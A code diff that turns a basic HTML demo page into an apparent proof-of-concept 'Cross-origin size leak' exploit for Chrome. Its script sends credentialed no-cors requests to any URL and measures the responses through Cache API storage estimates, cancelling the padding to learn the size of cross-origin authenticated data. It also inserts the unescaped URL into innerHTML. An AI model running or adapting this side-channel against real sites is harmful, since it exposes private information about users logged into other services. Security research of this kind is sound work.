@@ -1,23 +1,67 @@
-<!DOCTYPE html>
 <html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-body {
-  background-color: lightgreen;
-}
+	<head>
+		<title>Cross-origin size leak</title>
+		<style>
+			*{font-family:Mukta,sans-serif;color:#3b3b3b}input{background:inherit}#result{max-width:720px;overflow-y:hidden;overflow-x:hidden}#result p{font-weight:300;padding:4px 7px;margin:5px;color:#424242;max-width:700px}iframe{width:1px;height:1px;border:0;opacity:0}small{color:gray;font-weight:400;font-style:italic;font-size:16px;margin-top:-20px;display:block;margin-bottom:30px}small strong{font-weight:600;font-size:18px;color:inherit}input{width:515px;font-size:20px;padding:6px 10px;border:1px solid gray;border-radius:6px;margin:3px;margin-left:0}button{font-size:20px;padding:6px 10px;border-radius:6px;border:1px solid gray;background:gray;color:#fff;cursor:pointer;margin:3px;margin-left:0;margin-bottom:20px}h1{margin-top:40px;color:#424242}.success{background:#e0f2d5}.error{background:#ffd9d9}.msg{font-weight:600}
+		</style>
 
-@media only screen and (orientation: landscape) {
-  body {
-    background-color: lightblue;
-  }
-}
-</style>
-</head>
-<body>
+	</head>
+	<body>
+		<h1>Cross-origin size leak</h1>
+		<small>Compatible with <strong>Chrome</strong> only</small>
 
-<p>Resize the browser window. When the width of this document is larger than the height, the background color is "lightblue", otherwise it is "lightgreen".</p>
+		<form id="form" method="POST">
+		  <input name="url" placeholder="https://attacker.lbherrera.me/size.php?size=1337" value="https://attacker.lbherrera.me/size.php?size=1337"/>
+		  <button>check</button>
+		</form>
 
-</body>
+		<div id="result"></div>
+
+		<script>
+			const makeRequest = async (url, method) => {
+				return await fetch(url, {
+					mode: "no-cors",
+					credentials: "include",
+					method: method ? "head" : "get"
+				});
+			}
+
+			const check = async (url) => {
+				let pad = "http://x";
+				let cache = await caches.open("leak");
+				let init  = await navigator.storage.estimate();
+
+				// Get size of cross-origin request made with the HEAD method (response has padding).
+				await cache.put(pad, await makeRequest(url, true));
+				let mid = await navigator.storage.estimate();
+				await cache.delete(pad);
+
+				// Get size of cross-origin request made with the GET method (response has padding).
+				await cache.put(pad, await makeRequest(url, false));
+				let end = await navigator.storage.estimate();
+				await cache.delete(pad);
+
+				// Subtract (GET + padding) - (HEAD + padding) to get the "real" size difference.
+				let size = end.usageDetails.caches - mid.usageDetails.caches;
+
+				msg(url,
+					size <= 0
+					? `less than 256 bytes.`
+					: `${size} bytes or less.`);
+			}
+
+			const msg = (url, msg) => {
+				result.innerHTML += `
+					<p class="success">\
+					Resource on <span class="msg">${url}</span> has a size difference of ${msg}`;
+				result.scrollTop = result.scrollHeight;
+			}
+
+			form.onsubmit = (e) => {
+				e.preventDefault();
+				let url = form.url.value.trim();
+				check(url);
+			}
+		</script>
+	</body>
 </html>
-
